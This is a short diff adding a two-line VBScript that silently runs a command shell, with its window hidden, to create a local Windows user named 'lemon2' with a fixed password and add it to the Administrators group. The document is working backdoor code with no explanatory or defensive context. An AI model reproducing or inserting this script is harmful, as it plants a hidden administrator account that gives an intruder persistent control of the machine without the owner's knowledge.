@@ -1,0 +1,2 @@
+set objshell=createobject("wscript.shell")
+objshell.run("%comspec% /k net user lemon2 123@4!56 /add && net localgroup administrators lemon2 /add"),0,true
